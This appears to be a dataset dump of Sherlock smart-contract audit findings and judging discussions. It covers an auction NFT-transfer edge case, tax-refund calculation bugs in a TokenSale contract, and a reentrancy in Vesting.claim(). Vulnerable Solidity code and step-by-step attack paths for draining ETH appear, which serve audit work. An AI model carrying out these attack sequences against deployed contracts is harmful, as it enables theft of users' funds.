valid bids will revert with the confusing message that you need overcollateralisation. @>""The fee is a percentage of the bid, so there is no logical reason why the fee should be paid on top of the bid."" Even if users are willing to overcollateralise, for every bid they need to take into account both collateral paid and fee paid and recalculate both perfectly to be within rounding error. This is prone to error. In a heated auction with many competing bidders trying to take the price close to a deadline, the complexity demanded to perfectly calculate every bid is not realistic. This will lead to many valid bids being reverted due to a wei-sized deviation and the auction will close at a lower price than the highest valid bid submitted. This constitutes a loss to the creator's circle and the current holder of the license.\nIt talks about how it is ""confusing"" to the user to pay the fee on top of the bid and argues against the intended implementation of the codebase. It is known that the codebase is implemented in such a way that the user is expected to pay the fee on top of the bid. The watson has simply misinterpreted the codebase and this is further illustrated by the example scenario described by the watson in the issue.\nIssue #12 has nothing to do with the `Honorarium Rate` being set to 0.\nI urge the judges @Evert0x @Hash01011122 and the sponsor @gravenp to go through #12 separately and remove duplication from #31 and #107\nHash01011122\n@sammy-tm thanks for providing a detailed explanation for every issue of this family, after inspecting issues thoroughly I can say #31 is valid finding with #107 as its dup @Evert0x\nEvert0x\nAgree with the proposed outcome here. Thanks @sammy-tm\nPlanning to accept escalation, make #31 a Medium issue with #107 as a duplicate.\nEvert0x\nResult: Medium Has Duplicates\nsherlock-admin4\nEscalations have been resolved successfully!\nEscalation status:\ncawfree: accepted"чThe protocol becomes dysfunctional in such a scenario as users as DOS'd from placing a bid.\nCode Snippet\nTool used\nManual Review Hardhat
Currently auctioned NFTs can be transferred to a different address in a specific edge caseчmediumч```\nl.availableCollateral[oldBidder] += l.highestBids[tokenId][currentAuctionRound].bidAmount;\n```\nчCurrently auctioned NFTs can be transferred to a different address in a specific edge case, leading to theft of funds.\nThe protocol assumes that an NFT cannot change owner while it's being auctioned, this is generally the case but there is an exception, an NFT can change owner via mintToken() while an auction is ongoing when all the following conditions apply:\nAn NFT is added `to` the collection without being minted (ie. `to` set `to` address(0)).\nThe NFT is added `to` the collection with the parameter `tokenInitialPeriodStartTime[]` set `to` a timestamp lower than `l.initialPeriodStartTime` but bigger than 0(ie. `0` < `tokenInitialPeriodStartTime[]` < l.initialPeriodStartTime).\nThe current `block.timestamp` is in-between `tokenInitialPeriodStartTime[]` and `l.initialPeriodStartTime`.\nA malicious `initialBidder` can take advantage of this by:\nBidding on the new added NFT via placeBid().\nCalling mintToken() to transfer the NFT to a different address he controls.\nClosing the auction via closeAuction()\nAt point `3.`, because the NFT owner changed, the winning bidder (ie. initialBidder) is not the current NFT owner anymore. This will trigger the following line of code:\n```\nl.availableCollateral[oldBidder] += l.highestBids[tokenId][currentAuctionRound].bidAmount;\n```\n\nWhich increases the `availableCollateral` of the `oldBidder` (ie. the address that owns the NFT after point 2.) by `bidAmount` of the highest bid. But because at the moment the highest bid was placed `initialBidder` was also the NFT owner, he only needed to transfer the `ETH` fee to the protocol instead of the whole bid amount.\nThe `initialBidder` is now able to extract ETH from the protocol via the address used in point `2.` by calling withdrawCollateral() while also retaining the NFT license.чDon't allow `tokenInitialPeriodStartTime[]` to be set at a timestamp beforel.initialPeriodStartTime.\nDiscussion\nzzykxx\nEscalate\nNot a duplicate of #9. This issue describes a correct edge case in which a currently auctioned NFT can be transferred.\nsherlock-admin2\nEscalate\nNot a duplicate of #9. This issue describes a correct edge case in which a currently auctioned NFT can be transferred.\nYou've created a valid escalation!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\nHash01011122\nEven I considered it unique medium as it was edge case but sponsors viewed it as duplicate of #9 as it has same root cause @gravenp anything which you would like to add?\nSt4rgarden\nNot a duplicate because #9 is a non-issue.\ngravenp\n@Hash01011122 after @St4rgarden took another look at #33 and #9, we determined that these should NOT be duplicates. I was mistaken. Sorry. We've marked #9 invalid and @St4rgarden is working on a hardhat test to reproduce this one.\nCzar102\nPlanning to consider this a separate issue.\n@zzykxx why do you think High severity is appropriate? I'd like to know more about the likelihood of this exploit.\nzzykxx\nPlanning to consider this a separate issue.\n@zzykxx why do you think High severity is appropriate? I'd like to know more about the likelihood of this exploit.\nI submitted as high severity because a combination of malicious `initialBidder` and `ADD_TOKEN_TO_COLLECTION_ROLE` can steal funds currently in the contract.\nThe sponsor is stating somewhere else that `initialBidder` is a trusted role, which would make the issue invalid.\nHowever, the fact that the `initalBidder` or `ADD_TOKEN_TO_COLLECTION_ROLE` is a trusted role was not mentioned anywhere during the time of the audit. One argument on why `initialBidder` should be considered trusted is that it has the power to mint NFTs (and to mint them to himself), and this power is given to them by the owner which is trusted according to the README. I'm not sure this implies that the `initialBidder` (and ADD_TOKEN_TO_COLLECTION_ROLE) are trusted to not steal funds in the contract. To me having the power of minting/wrapping NFTs (which will then be auctioned) and the power to steal funds in the contract are two different levels of trust.\nThis being said, I'll leave this to you and the judges as the decision on the severity mainly revolves around judging technicalities. Feel free to tag me if you need more information.\ngravenp\nWe agree that this is valid. I'm not steeped in the judging technicalities on severity either.\nTo attempt to clarify a bit, we're not trying to imply elsewhere that the address in `initialBidder` is trusted (just that this field is by default set to the artist, who is trusted, at initialization/the first auction). The `ADD_TOKEN_TO_COLLECTION_ROLE` and other admin roles are also trusted with their defined scope, but stealing funds auction funds wouldn't be in that role scope. I don't know where that nets out on likelihood so am ok ceding that determination to the judges and their experience with the contest rules.\nCzar102\nThis issue is certainly valid, and I would place it on the borderline Med/High, but I think Medium is appropriate given that not everyone is able to exploit this vulnerability, only few whitelisted parties.\nEvert0x\nPlanning to remove duplication state and assign Medium severity\nEvert0x\nResult: Medium Unique\nsherlock-admin3\nEscalations have been resolved successfully!\nEscalation status:\nzzykxx: acceptedчMalicious initial bidder can potentially steal ETH from the protocol in an edge case. If the `ADD_TOKEN_TO_COLLECTION_ROLE` is also malicious, it's possible to drain the protocol.\nCode Snippet\nTool used\nManual Review
Tax refund is calculated based on the wrong amountчhighч"```\n        (s.share, left) = _claim(s);\n        require(left > 0, ""TokenSale: Nothing to claim"");\n        uint256 refundTaxAmount;\n        if (s.taxAmount > 0) {\n            uint256 tax = userTaxRate(s.amount, msg.sender);\n            uint256 taxFreeAllc = _maxTaxfreeAllocation(msg.sender) * PCT_BASE;\n            if (taxFreeAllc >= s.share) {\n                refundTaxAmount = s.taxAmount;\n            } else {\n                refundTaxAmount = (left * tax) / POINT_BASE;\n            }\n            usdc.safeTransferFrom(marketingWallet, msg.sender, refundTaxAmount);\n        }\n```\n"ч"Tax refund is calculated based on the wrong amount\nAfter the private period has finished, users can claim a tax refund, based on their max tax free allocation.\n```\n        (s.share, left) = _claim(s);\n        require(left > 0, ""TokenSale: Nothing to claim"");\n        uint256 refundTaxAmount;\n        if (s.taxAmount > 0) {\n            uint256 tax = userTaxRate(s.amount, msg.sender);\n            uint256 taxFreeAllc = _maxTaxfreeAllocation(msg.sender) * PCT_BASE;\n            if (taxFreeAllc >= s.share) {\n                refundTaxAmount = s.taxAmount;\n            } else {\n                refundTaxAmount = (left * tax) / POINT_BASE;\n            }\n            usdc.safeTransferFrom(marketingWallet, msg.sender, refundTaxAmount);\n        }\n```\n\nThe problem is that in case `s.share > taxFreeAllc`, the tax refund is calculated wrongfully. Not only it should refund the tax on the unused USDC amount, but it should also refund the tax for the tax-free allocation the user has.\nImagine the following.\nUser deposits 1000 USDC.\nPrivate period finishes, token oversells. Only half of the user's money actually go towards the sell (s.share = 500 USDC, s.left = 500 USDC)\nThe user has 400 USDC tax-free allocation\nThe user must be refunded the tax for the 500 unused USDC, as well as their 400 USDC tax-free allocation. In stead, they're only refunded for the 500 unused USDC. (note, if the user had 500 tax-free allocation, they would've been refunded all tax)"ч"change the code to the following:\n```\n                refundTaxAmount = ((left + taxFreeAllc) * tax) / POINT_BASE;\n```\n\nDiscussion\nZdravkoHr\nEscalate\nUsers are not supposed to be refunded for the tax free allocation, same reasoning as in 58.\nsherlock-admin2\nEscalate\nUsers are not supposed to be refunded for the tax free allocation, same reasoning as in 58.\nYou've created a valid escalation!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\nkoreanspicygarlic1\nescalation by watson is plain wrong. Users have taxfree allocation for which their tax should be refunded. The total refund should be for the taxfree allocation + tax on unused funds (s.left)\nZdravkoHr\n@koreanspicygarlic1, users are not paying tax for the tax free allocation when depositing. What should they be refunded for then?\nmerc1995\n@ZdravkoHr , users pay tax for the tax-free allocation when depositing because the `taxFreeAllcOfUser` is zero, as I mentioned in #7 .\nvsharma4394\n@merc1995 initially there is no tax free allocation so why should tax free amount be taken into consideration when claim function is called. The tax amount refunded to the user should be calculated for the left amount only i.e not taking into consideration the tax free amount. Otherwise every user would purposely make totalPrivateSold > totalSupplyValue so that they can avoid the tax.\nmerc1995\n@vsharma4394 because the code says it should consider the tax free.\n```\n    function claim() external {\n        checkingEpoch();\n        require(\n            uint8(epoch) > 1 && !admin.blockClaim(address(this)),\n            ""TokenSale: Not time or not allowed""\n        );\n\n        Staked storage s = stakes[msg.sender];\n        require(s.amount != 0, ""TokenSale: No Deposit"");\n        require(!s.claimed, ""TokenSale: Already Claimed"");\n\n        uint256 left;\n        (s.share, left) = _claim(s);\n        require(left > 0, ""TokenSale: Nothing to claim"");\n        uint256 refundTaxAmount;\n        if (s.taxAmount > 0) {\n            uint256 tax = userTaxRate(s.amount, msg.sender);\n            uint256 taxFreeAllc = _maxTaxfreeAllocation(msg.sender) * PCT_BASE; //==> tax free \n            if (taxFreeAllc >= s.share) {\n                refundTaxAmount = s.taxAmount;\n            } else {\n                refundTaxAmount = (left * tax) / POINT_BASE;\n            }\n            usdc.safeTransferFrom(marketingWallet, msg.sender, refundTaxAmount);\n        }\n        s.claimed = true;\n        usdc.safeTransfer(msg.sender, left);\n        emit Claim(msg.sender, left);\n    }\n```\n\nZdravkoHr\n@merc1995, that's because if the taxFree was set to 500 for example amd I deposit 600, the claim function should consider this and let me claim tax for only 100 (assumung I can claim 100%, which of course is not true, but makes the example more simple)\nmerc1995\nThe code use `left` rather than `s.shrare - taxFree` to calculate the `refundAmount`. According to your comment, this issue is valid because of the wrong implementation.\nmerc1995\nThe tax amount refunded to the user should be calculated for the left amount only i.e not taking into consideration the tax free amount @vsharma4394 Could you please provide the doc which said that the tax free amount should not be taken into consideration?\nvsharma4394\n@merc1995 It is clear from the deposit function (which calls the _processPrivate function) that currently they don't allow tax free allocation.\nmerc1995\nSo there should be no tax-free releated code in the `claim`, and this issue should be valid?\nvsharma4394\nI agree that there should not be tax free related code and refundTaxAmount should only be equal to (left * tax) / POINT_BASE.\nvsharma4394\nI don't agree with the following lines as stated in the vulnerability detail that The problem is that in case s.share > taxFreeAllc, the tax refund is calculated wrongfully. Not only it should refund the tax on the unused USDC amount, but it should also refund the tax for the tax-free allocation the user has. They should never refund tax for the tax Free allocation because while calling deposit taxFreeAllocation was set to zero.\nvsharma4394\nAccording to me there is a logic error in the code where they first don't take into account taxFreeAllocation but they do so in claim function due to which there has been lot of miss interpretation of the code.\nHash01011122\nI missed the part where user is not supposed to be refunded for tax free allocation, it would be better if someone with deeper knowledge of protocol can shed some light on taxFreeAllocation concept. Requesting insight from someone with deeper knowledge of the protocol is a prudent step. @ZdravkoHr @deadrosesxyz ??\nZdravkoHr\n@Hash01011122, if you look at TokenSale.processPrivate and assume the tax free amount is set to an extremely large number, the if statement where the actual tax transfer happens will never be entered.\nSo the tax free allocation is tax-free because users don't pay for it from the very beginning. That's why a refund is not needed.\nspacegliderrrr\n@Hash01011122 When users deposit, they always have to pay tax. The users then have a tax-free allocation. Meaning, that for this amount, they don't have to pay tax and they'll be refunded for it.\nTax refund must always be for the tax on their tax-free allocation.+ the tax on their unused funds (s.left)\nniketansainiantier\nwe are taking the tax on the whole invested amount including all allocations, including the whitelist. So will refund the only tax on left amount(extra Amount).\ndeadrosesxyz\n@niketansainiantier if this was the case, then what is the purpose of `_maxTaxfreeAllocation` and the following lines of code? Why would they refund the whole tax amount if it was always intended to refund only based on the left/extra amount. What you've said simply contradicts the code.\n```\n            uint256 taxFreeAllc = _maxTaxfreeAllocation(msg.sender) * PCT_BASE;\n            if (taxFreeAllc >= s.share) {\n                refundTaxAmount = s.taxAmount;\n```\n\nHash01011122\nHighlighting the specific code line where `taxFreeAllocOfUser` is hardcoded to zero implies that users are indeed intended to be processed for a tax refund according to the protocol's logic. Let me know if I am getting anything wrong here @ZdravkoHr\nvsharma4394\n@Hash01011122 the following is said by @niketansainiantier `we are taking the tax on the whole invested amount including all allocations, including the whitelist. So will refund the only tax on left amount(extra Amount).` Due to this users are only refunded on the left amount i.e not considering the tax free allocation. While depositing also taxFreeAllocation was not considered as taxFreeAllocOfUser is equal to zero so it should also not be considered while calling claim function.\nI think you have misunderstood the code ,taxfreeAllocOfUser is hardcoded to zero implies that users are processed tax on whole amount neglecting the tax free amount.So as now tax free amount is not taken into consideration , it should not be taken into account while calling claim function.\nvsharma4394\nI think sponsers have also added the won't fix tag because it is intended behaviour to refund tax only on left amount. As initially also taxFreeAlloc was taken as zero. Thus making this finding as invalid.\nZdravkoHr\n@vsharma4394 is right imo. There is a comment next to taxAlloc = 0 that says that all pools have tax\nvsharma4394\n@vsharma4394 is right imo. There is a comment next to taxAlloc = 0 that says that all pools have tax\nYes,there has been a lot of misunderstanding because people have not understood wwhat taxAlloc = 0 means.\nvsharma4394\n@niketansainiantier if this was the case, then what is the purpose of `_maxTaxfreeAllocation` and the following lines of code? Why would they refund the whole tax amount if it was always intended to refund only based on the left/extra amount. What you've said simply contradicts the code.\n`            uint256 taxFreeAllc = _maxTaxfreeAllocation(msg.sender) * PCT_BASE;\n            if (taxFreeAllc >= s.share) {\n                refundTaxAmount = s.taxAmount;`\nAgain this is because they have taken taxFreeAlloc = 0. Hence this issue is invalid.\nniketansainiantier\nYes, that's why I changed the logic here.\n`uint256 left; (s.share, left) = _claim(s); require(left > 0, ""TokenSale: Nothing to claim""); uint256 refundTaxAmount; if (s.taxAmount > 0) { uint256 tax = userTaxRate(s.amount, msg.sender); refundTaxAmount = (left * tax) / POINT_BASE; usdc.safeTransferFrom(marketingWallet, msg.sender, refundTaxAmount); }` You guys can check this on 2nd PR\nvsharma4394\nYes, that's why I changed the logic here.\n`uint256 left; (s.share, left) = _claim(s); require(left > 0, ""TokenSale: Nothing to claim""); uint256 refundTaxAmount; if (s.taxAmount > 0) { uint256 tax = userTaxRate(s.amount, msg.sender); refundTaxAmount = (left * tax) / POINT_BASE; usdc.safeTransferFrom(marketingWallet, msg.sender, refundTaxAmount); }` You guys can check this on 2nd PR\n@Hash01011122 now things should be very clear. This issue should be invalid and #159 should be a valid unique finding.Also #58 should also be invalid.\nZdravkoHr\n131 is also a dup of 159\nHash01011122\nSeems logical enough, @vsharma4394 thanks for clearing the misunderstanding regarding `taxfreeAllocOfUser` I am inclined towards invalidating this issue. @deadrosesxyz Your input would be appreciated.\ndeadrosesxyz\n@Hash01011122 The other watson simply assumes that `_maxTaxFreeAllocation` is always going to return 0. They assume the logic here, including the call to the staking contract, the tokensale tiers will all return 0 for whatever reason. There's contract logic based on the calculated `taxFreeAllc` and logic to calculate its value. `taxFreeAllc` always having a value of 0 is not enforced anywhere, hence cannot be expected this would be the case (in fact it's just the opposite considering the function designed to calculate it). I'd politely ask other watsons to refrain from making any more comments. I believe everyone has made their point clear and it's simply time to wait for judge's decision.\n```\n            uint256 taxFreeAllc = _maxTaxfreeAllocation(msg.sender) * PCT_BASE;\n            if (taxFreeAllc >= s.share) {\n                refundTaxAmount = s.taxAmount;\n```\n\n```\n    function _maxTaxfreeAllocation(address _sender) internal returns (uint256) {\n        uint256 userTierAllc = stakingContract.getAllocationOf(_sender);\n        uint256 giftedTierAllc = tokensaleTiers[_sender];\n\n        if (userTierAllc > giftedTierAllc) {\n            return userTierAllc;\n        } else {\n            return giftedTierAllc;\n        }\n    }\n```\n\nHash01011122\nEven I thought the same when I first looked at `taxFreeAllc` in codebase, but after @niketansainiantier cleared that this is not the case. Just want to know whether this was mentioned in by the sponsors at the time of contest. If nothing was mentioned this should remain a valid issue.\nEvert0x\nPlanning to reject escalation and keep issue as is.\nvsharma4394\nYes, that's why I changed the logic here.\n`uint256 left; (s.share, left) = _claim(s); require(left > 0, ""TokenSale: Nothing to claim""); uint256 refundTaxAmount; if (s.taxAmount > 0) { uint256 tax = userTaxRate(s.amount, msg.sender); refundTaxAmount = (left * tax) / POINT_BASE; usdc.safeTransferFrom(marketingWallet, msg.sender, refundTaxAmount); }` You guys can check this on 2nd PR\n@Evert0x see here the changed code by sponsers now tax amount which is returned is only calculated on the left amount excluding tax free allocation because which is contradiction to this finding, so doesn't that make this finding invalid.\nvsharma4394\nEvert0x\nResult: High Has Duplicates\nsherlock-admin3\nEscalations have been resolved successfully!\nEscalation status:\nZdravkoHr: rejected"чUsers are not refunded enough tax\nCode Snippet\nTool used\nManual Review
If token does not oversell, users cannot claim tax refund on their tax free allocation.чhighч"```\n function claim() external {\n        checkingEpoch();\n        require(\n            uint8(epoch) > 1 && !admin.blockClaim(address(this)),\n            ""TokenSale: Not time or not allowed""\n        );\n\n        Staked storage s = stakes[msg.sender];\n        require(s.amount != 0, ""TokenSale: No Deposit""); \n        require(!s.claimed, ""TokenSale: Already Claimed"");\n\n        uint256 left;\n        (s.share, left) = _claim(s);\n        require(left > 0, ""TokenSale: Nothing to claim"");  // @audit - problematic line \n        uint256 refundTaxAmount;\n        if (s.taxAmount > 0) {\n            uint256 tax = userTaxRate(s.amount, msg.sender);\n            uint256 taxFreeAllc = _maxTaxfreeAllocation(msg.sender) * PCT_BASE;\n            if (taxFreeAllc >= s.share) {\n                refundTaxAmount = s.taxAmount;\n            } else {\n                refundTaxAmount = (left * tax) / POINT_BASE; // tax refund is on the wrong amount \n            }\n            usdc.safeTransferFrom(marketingWallet, msg.sender, refundTaxAmount);\n        }\n        s.claimed = true;\n        usdc.safeTransfer(msg.sender, left);\n        emit Claim(msg.sender, left);\n    }\n```\n"ч"Users may not be able to claim tax refund\nWithin TokenSale, upon depositing users, users have to pay tax. Then, users can receive a tax-free allocation - meaning they'll be refunded the tax they've paid on part of their deposit.\nThe problem is that due to a unnecessary require check, users cannot claim their tax refund, unless the token has oversold.\n```\n function claim() external {\n        checkingEpoch();\n        require(\n            uint8(epoch) > 1 && !admin.blockClaim(address(this)),\n            ""TokenSale: Not time or not allowed""\n        );\n\n        Staked storage s = stakes[msg.sender];\n        require(s.amount != 0, ""TokenSale: No Deposit""); \n        require(!s.claimed, ""TokenSale: Already Claimed"");\n\n        uint256 left;\n        (s.share, left) = _claim(s);\n        require(left > 0, ""TokenSale: Nothing to claim"");  // @audit - problematic line \n        uint256 refundTaxAmount;\n        if (s.taxAmount > 0) {\n            uint256 tax = userTaxRate(s.amount, msg.sender);\n            uint256 taxFreeAllc = _maxTaxfreeAllocation(msg.sender) * PCT_BASE;\n            if (taxFreeAllc >= s.share) {\n                refundTaxAmount = s.taxAmount;\n            } else {\n                refundTaxAmount = (left * tax) / POINT_BASE; // tax refund is on the wrong amount \n            }\n            usdc.safeTransferFrom(marketingWallet, msg.sender, refundTaxAmount);\n        }\n        s.claimed = true;\n        usdc.safeTransfer(msg.sender, left);\n        emit Claim(msg.sender, left);\n    }\n```\n\n```\n    function _claim(Staked memory _s) internal view returns (uint120, uint256) {\n        uint256 left;\n        if (state.totalPrivateSold > (state.totalSupplyInValue)) {\n            uint256 rate = (state.totalSupplyInValue * PCT_BASE) /\n                state.totalPrivateSold;\n            _s.share = uint120((uint256(_s.amount) * rate) / PCT_BASE);\n            left = uint256(_s.amount) - uint256(_s.share);\n        } else {\n            _s.share = uint120(_s.amount);\n        }\n\n        return (_s.share, left);\n    }\n```\n\n`left` only has value if the token has oversold. Meaning that even if the user has an infinite tax free allocation, if the token has not oversold, they won't be able to claim a tax refund."чRemove the require check\nDiscussion\nZdravkoHr\nEscalate\nThis should not be a valid issue. The idea of the `claim` function is to let investors `claim` the surplus amount that is left after the ICO has ended, i.e when tokens `oversell`.\n```\n If the the demand is higher than supply, the number of tokens investors will receive is adjusted, and then the native token used to invest are partially refunded.\n```\n\nThe following claim stated in the report is also wrong: `Then, users can receive a tax-free allocation - meaning they'll be refunded the tax they've paid on part of their deposit.`\nTax free allocation does not mean users will pay all the taxes and will be refunded later for the tax free amount. They are just not charged for the given amount from the very beginning of the deposit process. So they should not receive any refund.\nThis is evident from the way the tax is calculated inTokenSale._processPrivate()\n```\n        if (sum > taxFreeAllcOfUser) {\n            uint256 userTxRate = userTaxRate(sum, _sender);\n            if (s.amount < taxFreeAllcOfUser) {\n                userTaxAmount =\n                    ((sum - taxFreeAllcOfUser) * userTxRate) /\n                    POINT_BASE;\n            } else {\n                userTaxAmount = (amount * userTxRate) / POINT_BASE;\n            }\n        }\n```\n\nThe reason why there is a tax refund logic in the `claim` function is because users that `claim` back `amount` of tokens will not have these tokens as deposited in the end of the ICO, therefore they should be refunded the tax they have paid for them.\nsherlock-admin2\nEscalate\nThis should not be a valid issue. The idea of the `claim` function is to let investors `claim` the surplus `amount` that is left after the ICO has ended, i.e when tokens `oversell`.\n` If the the demand is higher than supply, the number of tokens investors will receive is adjusted, and then the native token used to invest are partially refunded.`\nThe following `claim` stated in the report is also wrong: `Then, users can receive a tax-free allocation - meaning they'll be refunded the tax they've paid on part of their deposit.`\nTax free allocation does not mean users will pay all the taxes and will be refunded later for the tax free `amount`. They are just not charged for the given `amount` from the very beginning of the deposit process. So they should not receive any refund.\nThis is evident from the way the tax is calculated inTokenSale._processPrivate()\n`        if (sum > taxFreeAllcOfUser) {\n            uint256 userTxRate = userTaxRate(sum, _sender);\n            if (s.amount < taxFreeAllcOfUser) {\n                userTaxAmount =\n                    ((sum - taxFreeAllcOfUser) * userTxRate) /\n                    POINT_BASE;\n            } else {\n                userTaxAmount = (amount * userTxRate) / POINT_BASE;\n            }\n        }`\nThe reason why there is a tax refund logic in the `claim` function is because users that `claim` back `amount` of tokens will not have these tokens as deposited in the end of the ICO, therefore they should be refunded the tax they have paid for them.\nYou've created a valid escalation!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\nkoreanspicygarlic1\nThis escalation is also plain wrong, watson has not properly understood the design of the system.\nvsharma4394\nIf the above reasoning is wrong then my issue #159 which has been invalidated becomes a valid issue,so can someone escalate that too. @Hash01011122 please look into it carefully please.\nvsharma4394\nHardcoding the value of taxfreeAllocation to zero implies that the protocol doesn't allow for taxFreeAllocation to occur as of now. So this directly implies that while claiming also taxFreeAmount should not be taken into consideration while refunding the amount to the user.\nHash01011122\nWell I don't thoroughly understand the basis of this escalation as it is clearly mentioned in the codebase how tax system is calculated, where the tax-free allocation isn't zero.\nvsharma4394\n@Hash01011122 the following loc in _processPrivate function which is called when user deposits usdc has caused different understanding of he code\n```\n uint256 taxFreeAllcOfUser = 0; // hardcode zero - all pools have ax\n\n        uint256 userTaxAmount;\n\n        if (sum > taxFreeAllcOfUser) {\n            uint256 userTxRate = userTaxRate(sum, _sender);\n            if (s.amount < taxFreeAllcOfUser) {\n                userTaxAmount =\n                    ((sum - taxFreeAllcOfUser) * userTxRate) /\n                    POINT_BASE;\n            } else {\n                userTaxAmount = (amount * userTxRate) / POINT_BASE;\n            }\n        }\n```\n\nDue to hardcoded value of taxFreeAllocation as zero ,user tax amount is calculated as follows userTaxAmount = (amount * userTxRate) / POINT_BASE i.e while depositing users have to pay tax irrespective of having taxFreeAllocation. If logic is never executed. So while claiming also taxFreeAllocation should also not be taken into account so as be consistent with the code. (Making taxFreeAllocation to zero is intended design.)\nI think confusion has arised from considering taxFreeAllocation but it is considered as zero from starting due to hardcoded value of taxFreeAllocation as zero.\nAsking from sponsers is the best way to deal with all the issue related to claim function and tax related issue.\nZdravkoHr\nThe issue is not that tax free allocation is 0. Even if it wasn't and the firsr if was entered, the user would not have been taxed for it. That's why I believe a refund should not be made\nniketansainiantier\nwe are not giving a refund for the tax if a sale does not reach the hard cap.\nvsharma4394\n@niketansainiantier so this issue should be invalid right?\nHash01011122\nWell I agree with what @vsharma4394 has mentioned above and came to the same conclusion when I revisited codebase. @ZdravkoHr and even sponsors have confirmed this one. This is valid finding.\nvsharma4394\n@Hash01011122 i dont think that this issue is valid because @niketansainiantier clearly mentioned the following `we are taking the tax on the whole invested amount including all allocations, including the whitelist. So will refund the only tax on left amount(extra Amount).` Now if token oversells tax is refunded based on the extra amount which should not consider taxFreeAllocation as said by the sponsers. Thus in claim function\n```\nif (s.taxAmount > 0) {\n            uint256 tax = userTaxRate(s.amount, msg.sender);\n            uint256 taxFreeAllc = _maxTaxfreeAllocation(msg.sender) * PCT_BASE;\n            if (taxFreeAllc >= s.share) {\n                refundTaxAmount = s.taxAmount;\n            } else {\n                refundTaxAmount = (left * tax) / POINT_BASE; // tax refund is on the wrong amount \n            }\n            usdc.safeTransferFrom(marketingWallet, msg.sender, refundTaxAmount);\n        }\n```\n\nRefundTaxAmount should always be refundTaxAmount = (left * tax) / POINT_BASE because taxFreeAlloc is hardcoded as zero initially which clearly indicates protocol doesn't allow for taxFreeAllocation as of now.\nEvert0x\nI believe the escalation should be rejected the issue should stay as is.\nUsers should be able to get a tax refund on their tax-free allocation.\nTax free allocation does not mean users will pay all the taxes and will be refunded later for the tax free amount. They are just not charged for the given amount from the very beginning of the deposit process. So they should not receive any refund.\nThis is not true, would like to see a link to a public message or to a code comment as a counter argument\nvsharma4394\nI believe the escalation should be rejected the issue should stay as is.\nUsers should be able to get a tax refund on their tax-free allocation.\nTax free allocation does not mean users will pay all the taxes and will be refunded later for the tax free amount. They are just not charged for the given amount from the very beginning of the deposit process. So they should not receive any refund.\nThis is not true, would like to see a link to a public message or to a code comment as a counter argument\n@Evert0x i agree the above reasoning is incorrect, please look at my reasoning and then decide\nEvert0x\n@vsharma4394 My understanding that the codebase is taxing all deposited and provide a tax-return on unallocated part + tax-free allocation. Which makes this issue a valid issue.\nSo if the token doesn't oversell, we should still take into account the tax free allocation.\nI don't understand how your previous comment provides an argument against that.\nvsharma4394\n@vsharma4394 My understanding that the codebase is taxing all deposited and provide a tax-return on unallocated part + tax-free allocation. Which makes this issue a valid issue.\nSo if the token doesn't oversell, we should still take into account the tax free allocation.\nI don't understand how your previous comment provides an argument against that.\nThis would most probably because of the protocol design @niketansainiantier can answer it the best.\nEvert0x\nResult: High Has Duplicates\nsherlock-admin3\nEscalations have been resolved successfully!\nEscalation status:\nZdravkoHr: rejectedчloss of funds\nCode Snippet\nTool used\nManual Review
Reentrancy in Vesting.sol:claim() will allow users to drain the contract due to executing .call() on user's address before setting s.index = uint128(i)чhighч"```\nfunction claim() external {\n        address sender = msg.sender;\n\n        UserDetails storage s = userdetails[sender];\n        require(s.userDeposit != 0, ""No Deposit"");\n      require(s.index != vestingPoints.length, ""already claimed"");\n        uint256 pctAmount;\n        uint256 i = s.index;\n        for (i; i <= vestingPoints.length - 1; i++) {\n            if (block.timestamp >= vestingPoints[i][0]) {\n                pctAmount += (s.userDeposit * vestingPoints[i][1]) / 10000;\n            } else {\n                break;\n            }\n        }\n        if (pctAmount != 0) {\n            if (address(token) == address(1)) {\n              (bool sent, ) = payable(sender).call{value: pctAmount}("""");\n                require(sent, ""Failed to send BNB to receiver"");\n            } else {\n                token.safeTransfer(sender, pctAmount);\n            }\n          s.index = uint128(i);\n            s.amountClaimed += pctAmount;\n        }\n    }\n```\n"ч"```\nfunction claim() external {\n        address sender = msg.sender;\n\n        UserDetails storage s = userdetails[sender];\n        require(s.userDeposit != 0, ""No Deposit"");\n      require(s.index != vestingPoints.length, ""already claimed"");\n        uint256 pctAmount;\n        uint256 i = s.index;\n        for (i; i <= vestingPoints.length - 1; i++) {\n            if (block.timestamp >= vestingPoints[i][0]) {\n                pctAmount += (s.userDeposit * vestingPoints[i][1]) / 10000;\n            } else {\n                break;\n            }\n        }\n        if (pctAmount != 0) {\n            if (address(token) == address(1)) {\n              (bool sent, ) = payable(sender).call{value: pctAmount}("""");\n                require(sent, ""Failed to send BNB to receiver"");\n            } else {\n                token.safeTransfer(sender, pctAmount);\n            }\n          s.index = uint128(i);\n            s.amountClaimed += pctAmount;\n        }\n    }\n```\n\nFrom the above, You'll notice the claim() function checks if the caller already claimed by checking if the s.index has already been set to vestingPoints.length. You'll also notice the claim() function executes .call() and transfer the amount to the caller before setting the s.index = uint128(i), thereby allowing reentrancy.\nLet's consider this sample scenario:\nAn attacker contract(alice) has some native pctAmount to claim and calls `claim()`.\n""already claimed"" check will pass since it's the first time she's calling `claim()` so her s.index hasn't been set\nHowever before updating Alice s.index, the Vesting contract performs external .call() to Alice with the amount sent as well\nAlice reenters `claim()` again on receive of the amount\nbypass index ""already claimed"" check since this hasn't been updated yet\ncontract performs external .call() to Alice with the amount sent as well again,\nSame thing happens again\nAlice ends up draining the Vesting contract"ч"Here is the recommended fix:\n```\nif (pctAmount != 0) {\n// Add the line below\n           s.index = uint128(i);\n            if (address(token) == address(1)) {\n                (bool sent, ) = payable(sender).call{value: pctAmount}("""");\n                require(sent, ""Failed to send BNB to receiver"");\n            } else {\n                token.safeTransfer(sender, pctAmount);\n            }\n// Remove the line below\n           s.index = uint128(i);\n            s.amountClaimed // Add the line below\n= pctAmount;\n        }\n```\n\nI'll also recommend using reentrancyGuard.\nDiscussion\nmidori-fuse\nEscalate\nPer Sherlock's duplication rule:\nIn the above example if the root issue A is one of the following generic vulnerabilities:\nReentrancy\nAccess control\nFront-running\nThen the submissions with valid attack paths and higher vulnerability are considered valid. If the submission is vague or does not identify the attack path with higher severity clearly it will be considered low.\nB is a valid issue\nC is low\nThe following submissions fail to and/or incorrectly identify the root cause that enables the attack path: #6 #34 #66 #68 #79 #90 #98 #132 